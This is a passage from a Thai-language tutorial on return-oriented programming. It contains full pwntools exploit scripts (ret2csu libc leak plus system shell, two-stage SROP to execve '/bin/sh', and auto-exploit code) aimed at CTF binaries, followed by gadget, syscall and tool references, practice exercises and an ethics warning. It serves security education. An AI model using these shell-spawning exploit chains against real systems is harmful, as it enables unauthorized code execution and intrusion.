    payload2 = flat(b'A' * 72, rop2.chain())
    
    io.sendlineafter(b'Input: ', payload2)
    io.interactive()

pwn()
```

### 15.3 CTF Example: ret2csu

```python
#!/usr/bin/env python3
# ctf_ret2csu.py
# ระดับ: Advanced
# Mitigations: NX, ASLR, No canary, No PIE
# Challenge: ไม่มี pop rdx gadget ใน binary

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./ret2csu_chal')
libc = ELF('./libc.so.6')

# ===== หา __libc_csu_init gadgets =====
# Gadget A (ทำงาน): mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
# Gadget B (load):  pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

csu = elf.sym['__libc_csu_init']
gadget_A = csu + 0x40   # ตัวเลขอาจต่างกันขึ้นกับ gcc version
gadget_B = csu + 0x5a

log.info(f"__libc_csu_init @ {hex(csu)}")
log.info(f"Gadget A @ {hex(gadget_A)}")
log.info(f"Gadget B @ {hex(gadget_B)}")

def ret2csu_call(func_ptr, arg1, arg2, arg3):
    """
    สร้าง ret2csu chain เพื่อ call *func_ptr(arg1, arg2, arg3)
    หมายเหตุ: arg1 ถูก set ผ่าน r13d (32-bit!)
    """
    chain = flat(
        # Gadget B: load registers
        gadget_B,
        0,              # rbx = 0
        1,              # rbp = 1 (เพื่อ pass cmp rbx,rbp check)
        func_ptr,       # r12 = pointer ไปที่ function
        arg1,           # r13 = arg1 (ถูก truncate เป็น 32-bit)
        arg2,           # r14 = arg2 (full 64-bit)
        arg3,           # r15 = arg3 (full 64-bit)
        
        # Gadget A: execute
        gadget_A,
        
        # Cleanup: หลัง Gadget A จะ:
        # add rsp, 8
        # pop rbx, rbp, r12, r13, r14, r15
        0,              # padding สำหรับ add rsp, 8
        0,              # rbx (discard)
        0,              # rbp (discard)
        0,              # r12 (discard)
        0,              # r13 (discard)
        0,              # r14 (discard)
        0,              # r15 (discard)
    )
    return chain

# ===== STAGE 1: Leak libc =====
io = process('./ret2csu_chal')

write_got_ptr = elf.got['write']  # pointer ไปที่ write() ใน libc
write_got = elf.got['write']       # GOT entry ของ write

# เรียก write(1, got['write'], 8)
# ผ่าน ret2csu: func_ptr=write_got_ptr, arg1=1, arg2=got_write, arg3=8
leak_chain = ret2csu_call(write_got_ptr, 1, write_got, 8)

# ต้องกลับ main หลัง leak
main_addr = elf.sym['main']

payload1 = flat(
    b'A' * 72,
    leak_chain,
    main_addr,     # กลับ main
)

io.sendlineafter(b'Input: ', payload1)

write_leak = u64(io.recv(8))
libc_base = write_leak - libc.sym['write']
libc.address = libc_base

log.success(f"write@libc: {hex(write_leak)}")
log.success(f"libc base: {hex(libc_base)}")

# ===== STAGE 2: Shell =====
rop2 = ROP([elf, libc])
ret = rop2.find_gadget(['ret'])[0]

rop2.raw(ret)
rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])

io.sendlineafter(b'Input: ', b'A' * 72 + rop2.chain())
io.interactive()
```

### 15.4 CTF Exercise: SROP Challenge

```python
#!/usr/bin/env python3
# ctf_srop.py
# ระดับ: Advanced
# Challenge: binary เล็กมาก มีแค่ syscall; ret gadget

from pwn import *

context.arch = 'amd64'

# Minimal binary ที่มีแค่:
# - read syscall loop
# - syscall; ret gadget

elf = ELF('./mini_challenge')

# ===== หา addresses =====
syscall_ret = ...  # หาจาก binary
binsh_in_bss = elf.bss()   # จะเขียน /bin/sh ที่นี่

# ===== STAGE 1: Write "/bin/sh" ไป bss =====
# ใช้ read(0, bss, 8) ผ่าน SROP

frame1 = SigreturnFrame()
frame1.rax = constants.SYS_read    # 0 = read
frame1.rdi = 0                      # fd = stdin
frame1.rsi = binsh_in_bss           # buf = bss
frame1.rdx = 8                      # count = 8 bytes
frame1.rsp = binsh_in_bss + 0x200  # new stack หลัง read
frame1.rip = syscall_ret            # จะ execute read syscall

# Payload 1: trigger sigreturn + frame
# rax ต้องเป็น 15 ก่อน syscall
# วิธี: ส่ง payload ขนาด 15 bytes → read() return 15 → rax = 15

payload1 = flat(
    b'A' * offset,
    syscall_ret,       # call sigreturn (rax จาก read return = 15)
    bytes(frame1),     # fake frame
)

io = process('./mini_challenge')

# ส่ง payload ขนาดที่ทำให้ read return 15
io.send(payload1[:15])  # ส่ง 15 bytes ก่อน
io.send(payload1[15:])  # ส่งส่วนที่เหลือ

# หลัง sigreturn, read() จะรอรับ "/bin/sh\x00"
io.send(b'/bin/sh\x00')

# ===== STAGE 2: execve("/bin/sh", 0, 0) =====
frame2 = SigreturnFrame()
frame2.rax = constants.SYS_execve   # 59
frame2.rdi = binsh_in_bss           # "/bin/sh"
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall_ret

# ส่ง payload2 บน new stack ที่ frame1 ตั้งไว้
payload2 = flat(
    syscall_ret,
    bytes(frame2),
)

io.send(payload2[:15])
io.send(payload2[15:])

io.interactive()
```

### 15.5 การ Debug ROP Chains

```bash
# ===== Debug ด้วย GDB =====

# ติดตั้ง pwndbg (recommended)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Run ด้วย GDB
gdb -q ./vuln

# Set breakpoint ก่อน return
(gdb) disas vuln_func
(gdb) b *vuln_func+XX   # ที่ ret instruction

# Run ด้วย payload
(gdb) run <<< $(python3 -c "import sys; sys.stdout.buffer.write(payload)")

# หรือใช้ pwntools + GDB
# io = gdb.debug('./vuln', '''
#     b *vuln_func+50
#     continue
# ''')

# ดู ROP chain บน stack
(gdb) x/20gx $rsp

# trace execution
(gdb) si   # step into
(gdb) ni   # step over
(gdb) c    # continue
```

```python
# Debug ด้วย pwntools
from pwn import *

# เปิด GDB automatically
io = gdb.debug('./vuln', gdbscript='''
    # set breakpoint ที่ vulnerable function
    break *vuln_func+50
    continue
''')

# หรือ attach GDB
io = process('./vuln')
gdb.attach(io, gdbscript='''
    break *0x400600
    continue
''')
```

### 15.6 Automation และ Scripting

```python
#!/usr/bin/env python3
# rop_automation.py - สร้าง ROP exploit อัตโนมัติ

from pwn import *
import subprocess

def auto_exploit(binary_path, libc_path=None, remote_addr=None):
    """
    พยายาม exploit binary อัตโนมัติด้วย ROP
    """
    elf = ELF(binary_path)
    
    # Check mitigations
    print("[*] Checking mitigations...")
    print(elf.checksec())
    
    # หา offset ด้วย cyclic pattern
    print("[*] Finding offset...")
    io = process(binary_path)
    io.sendline(cyclic(300))
    io.wait()
    core = io.corefile
    
    try:
        rsp_val = core.read(core.rsp, 4)
        offset = cyclic_find(rsp_val)
        print(f"[+] Offset: {offset}")
    except:
        print("[-] Could not find offset automatically")
        return
    
    # Build ROP chain
    print("[*] Building ROP chain...")
    rop = ROP(elf)
    
    # ลองหา system + /bin/sh
    if libc_path:
        libc = ELF(libc_path)
        # ... two-stage exploit
    else:
        # ลอง one-stage ก่อน
        try:
            system = elf.plt['system']
            binsh = next(elf.search(b'/bin/sh'))
            
            pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
            ret = rop.find_gadget(['ret'])[0]
            
            payload = flat(
                b'A' * offset,
                ret,
                pop_rdi, binsh,
                system,
            )
            
            print("[*] Trying one-stage exploit...")
            io2 = process(binary_path)
            io2.sendline(payload)
            io2.sendline(b'id')
            result = io2.recvline(timeout=2)
            
            if b'uid=' in result:
                print("[+] Exploit successful!")
                io2.interactive()
                return
        except Exception as e:
            print(f"[-] One-stage failed: {e}")

# Run
auto_exploit('./vuln', libc_path='./libc.so.6')
```

---

## สรุปและ Reference

### Quick Reference: Gadgets ที่ใช้บ่อย

```
REGISTERS:
  pop rdi; ret     → set arg1 (rdi)
  pop rsi; ret     → set arg2 (rsi)  [อาจเป็น pop rsi; pop r15; ret]
  pop rdx; ret     → set arg3 (rdx)  [หายาก ต้องใช้ ret2csu หรือ libc gadget]
  pop rax; ret     → set rax (syscall number)
  pop rbp; ret     → set base pointer
  
SYSCALL:
  syscall; ret     → execute syscall (64-bit)
  int 0x80; ret    → execute syscall (32-bit)
  
STACK ALIGNMENT:
  ret              → align stack (16-byte boundary ก่อน system())
  
STACK PIVOT:
  xchg rsp, rax; ret → pivot stack ไปที่ rax
  leave; ret         → pivot ผ่าน rbp
  pop rsp; ret       → load rsp จาก stack

LIBC FUNCTIONS (64-bit):
  system(rdi)          → /bin/sh shell
  execve(rdi,rsi,rdx)  → execute program
  mprotect(rdi,rsi,rdx) → change memory protection
  puts(rdi)            → print string (for leak)
  write(rdi,rsi,rdx)   → write bytes (for leak)
  read(rdi,rsi,rdx)    → read bytes (for writing shellcode)
```

### Syscall Numbers Reference

```
64-bit Linux Syscalls (x86-64):
  0  = read
  1  = write
  2  = open
  3  = close
  9  = mmap
  10 = mprotect
  11 = munmap
  15 = rt_sigreturn
  59 = execve
  60 = exit
  
32-bit Linux Syscalls (x86):
  1  = exit
  3  = read
  4  = write
  5  = open
  11 = execve
  125 = mprotect
  119 = sigreturn
```

### Tools Reference

```bash
# ROPgadget - หา gadgets
ROPgadget --binary ./vuln --rop
ROPgadget --binary ./vuln --re "pop rdi"
ROPgadget --binary ./vuln --string "/bin/sh"

# ropper - หา gadgets (alternative)
ropper --file ./vuln --search "pop rdi"
ropper --file ./vuln --chain execve

# one_gadget - หา magic gadgets ใน libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# checksec - ตรวจ security mitigations
checksec --file=./vuln

# seccomp-tools - ดู seccomp filters
seccomp-tools dump ./vuln

# pwndbg/peda/gef - GDB extensions
gdb -q ./vuln  # ใช้ร่วมกับ extension ที่ติดตั้ง

# patchelf - แก้ไข ELF properties
patchelf --set-interpreter ./ld.so ./vuln
patchelf --set-rpath . ./vuln
```

### pwntools Cheatsheet

```python
from pwn import *

# Setup
context.arch = 'amd64'    # หรือ 'i386'
context.os = 'linux'
context.log_level = 'debug'   # หรือ 'info'

# Load binary/library
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# ROP object
rop = ROP(elf)
rop = ROP([elf, libc])

# หา gadgets
addr = rop.find_gadget(['pop rdi', 'ret'])[0]

# build chain
rop.call('system', [binsh_addr])
rop.raw(some_address)

# get bytes
chain = rop.chain()

# Sigreturn Frame
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh_addr
frame_bytes = bytes(frame)

# Process/Remote
io = process('./vuln')
io = remote('host', port)
io = gdb.debug('./vuln', gdbscript='...')

# Send/Receive
io.send(data)
io.sendline(data)
io.sendafter(b'prompt', data)
io.sendlineafter(b'prompt', data)

io.recv(n)
io.recvline()
io.recvuntil(b'marker')
io.recvall()

# Pack/Unpack
p32(val)    # pack 32-bit little-endian
p64(val)    # pack 64-bit little-endian
u32(bytes)  # unpack 32-bit
u64(bytes)  # unpack 64-bit

# Cyclic
cyclic(200)                  # สร้าง pattern
cyclic_find(b'aaab')         # หา offset

# Flat (สร้าง payload)
payload = flat(b'A'*72, p64(addr1), p64(addr2))
```

---

## แบบฝึกหัด CTF-Style

### Exercise 1: Basic ROP (ระดับ Easy)

```
โจทย์: binary ที่ compile ด้วย:
  gcc -o easy_rop easy.c -fno-stack-protector -no-pie -z execstack=no
  
Security: NX enabled, No canary, No PIE, No ASLR

เป้าหมาย:
  - Call system("/bin/sh")
  - Binary มี "/bin/sh" อยู่แล้ว
  - Binary มี system@plt

hint: ต้องการ gadgets: pop rdi; ret, ret (alignment)
```

### Exercise 2: ret2libc with Leak (ระดับ Medium)

```
โจทย์: binary ที่มี ASLR เปิด
Security: NX, ASLR, No canary, No PIE

เป้าหมาย:
  - Leak libc address ผ่าน puts(got['puts'])
  - คำนวณ libc base
  - Shell ด้วย system() จาก libc

hint: Two-stage exploit
```

### Exercise 3: ret2csu (ระดับ Hard)

```
โจทย์: binary ที่ไม่มี pop rdx gadget
Security: NX, ASLR, No canary, No PIE

เป้าหมาย:
  - ใช้ ret2csu เพื่อ call write(1, got, 8)
  - Leak libc
  - Shell

hint: __libc_csu_init gadgets
```

### Exercise 4: SROP (ระดับ Expert)

```
โจทย์: minimal binary ที่มีแค่ syscall; ret
Security: NX, ASLR, No canary, No PIE

เป้าหมาย:
  - ใช้ SROP เพื่อ call read() เขียน "/bin/sh"
  - ใช้ SROP เพื่อ execve("/bin/sh", 0, 0)

hint: rax = 15 สำหรับ sigreturn (= จำนวน bytes ที่ read)
```

---

## ข้อควรระวังและจริยธรรม

```
คำเตือนสำคัญ:
══════════════

1. ใช้ความรู้นี้เฉพาะในบริบทที่ได้รับอนุญาตเท่านั้น:
   - CTF competitions
   - Lab environments
   - Authorized penetration testing
   - Security research บน own systems

2. ห้ามใช้กับระบบที่ไม่ได้รับอนุญาต
   → ผิดกฎหมาย Computer Fraud and Abuse Act (CFAA)
   → ผิดกฎหมาย Computer Crime Act (พ.ร.บ. คอมพิวเตอร์ ไทย)

3. เมื่อพบช่องโหว่จริงในระบบ production:
   → ทำ Responsible Disclosure
   → แจ้ง vendor/owner ก่อน
   → อย่า exploit หรือ publish โดยไม่ได้รับอนุญาต

4. ทรัพยากรสำหรับเรียนรู้ที่ปลอดภัย:
   - pwnable.kr
   - exploit.education
   - hackthebox.com
   - tryhackme.com
   - CTFtime.org
```

---

*Part 073 จบ — ถัดไป Part 074: Heap Exploitation Basics*

> เนื้อหาใน Part นี้ครอบคลุม: ROP fundamentals, gadget types, finding tools, 32/64-bit exploitation, ret2csu, SROP, JOP, pwntools automation, ASLR bypass, one-shot gadgets, และ CTF examples  
> เหมาะสำหรับการเรียนรู้ binary exploitation ในบริบท CTF และ security research
